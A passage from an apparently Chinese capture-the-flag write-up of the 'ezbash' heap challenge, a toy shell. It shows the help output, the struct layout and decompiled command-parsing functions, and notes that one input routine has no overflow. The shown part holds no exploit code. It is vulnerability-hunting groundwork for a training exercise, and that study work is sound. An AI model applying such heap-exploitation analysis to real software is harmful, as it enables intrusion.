class=&#34;built_in&#34;&gt;help&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Welcome to ezbash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Just have fun here!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;The following are built &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;ls&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;touch&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;rm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;mkdir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;pwd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hacker:/$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;解决题目的第一个难点就是对于代码的审计，因为命令太多，相较于传统的菜单堆题，这道题提供的命令太多，导致分析题目需要很多时间。&lt;/p&gt;
&lt;h2 id=&#34;解题过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解题过程&#34;&gt;#&lt;/a&gt; 解题过程&lt;/h2&gt;
&lt;h3 id=&#34;题目的整体把握&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目的整体把握&#34;&gt;#&lt;/a&gt; 题目的整体把握&lt;/h3&gt;
&lt;p&gt;题目的所有文件的操作都是基于堆块，以及链表的数据结构&lt;/p&gt;
&lt;p&gt;重要的结构体&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; file            struc ; (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, mappedto_9)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; flag            dd ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000004&lt;/span&gt; name            db &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; dup(?)            ; &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;(C)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000014&lt;/span&gt; field_14        dd ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000018&lt;/span&gt; context         dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000020&lt;/span&gt; prev_bro        dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000028&lt;/span&gt; next_bro        dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000030&lt;/span&gt; futher          dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000038&lt;/span&gt; firstson        dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000040&lt;/span&gt; file            ends&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;整个体系中，其实概括 i 起来就是对于目录以及文件的操作，而这些对象都是基于 file 的结构体。flag 标志，对应的是目录（文件夹）或者文件，flag=0，表示的是文件夹，flag=1 表示的文件。文件夹中的所有子文件以及子文件夹都会通过一个双链表联系起来。file 的 firstson 会储存子文件链表的头指针。头节点的 prev_bro 和尾节点的 neat_bro 为 0，name16 字节的数组是 file 的名字，文件夹还会记录自己的父文件夹是的指针。文件则不会，但是文件会有一个特殊的 context 指针，指向另外一个堆块，用于储存写入文件的内容。&lt;/p&gt;
&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_BYTE *&lt;span class=&#34;title function_&#34;&gt;readn&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _BYTE *ptr; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;number&#34;&gt;0x150&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x150&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !ptr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: allocation error\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3 = getchar();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; || v3 == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ptr[v2++] = v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2 &amp;gt;= v1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v1 += &lt;span class=&#34;number&#34;&gt;0x150&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ptr = &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;(ptr, v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !ptr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: allocation error\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr[v2] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对于我们输入的命令默认是存放在一个 0x161 的堆块，但是当我们输入的长度过长时，会调整堆块的大小，所以这里是不存在在溢出的，虽然结尾没有补零，但是每次都会被 v1=0x150 限制，没有溢出的利用。&lt;/p&gt;
&lt;p&gt;对于每条命令，他的解析不是直接的匹配，而是会对数据进行切片的处理，如下，调用 strtok 库函数，会返回 delim 的前地址（代码中可能是由于 idapro 分析错误， i = strtok (0LL, &amp;quot;\t\r\n\a&amp;quot;)，实际上会完全分析我们输入的命令，应该是 i = strtok (i, &amp;quot;\t\r\n\a&amp;quot;)）这里会将我们的命令分解成操作命令，对象，对吧对应字符串的地址保存在另一个堆块里面。strtok 遇到空字符结束。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_QWORD *__fastcall &lt;span class=&#34;title function_&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _QWORD *ptr; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *i; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x200&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !ptr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: allocation error\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = strtok(a1, &lt;span class=&#34;string&#34;&gt;&amp;quot; \t\r\n\a&amp;quot;&lt;/span&gt;); i; i = strtok(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot; \t\r\n\a&amp;quot;&lt;/span&gt;) )&lt;span class=&#34;comment&#34;&gt;// split&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ptr[v3++] = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 &amp;gt;= v2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v2 += &lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ptr = &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;(ptr, &lt;span class=&#34;number&#34;&gt;8LL&lt;/span&gt; * v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !ptr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: allocation error\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr[v3] = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面指令的实现都是通过保留的字符串指针分析比较的。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !*cmd )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; L11(); ++i )                 &lt;span class=&#34;comment&#34;&gt;// i&amp;lt;11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(*cmd, *(&amp;amp;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; + i)) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (funcs[i])(cmd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s: command not found\n&amp;quot;&lt;/span&gt;, *cmd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;list 保存各个命令的名称进行比较，cmd 是处理后的保留字符串地址的 chunk。fucns 保存各个命令的函数的地址。&lt;/p&gt;
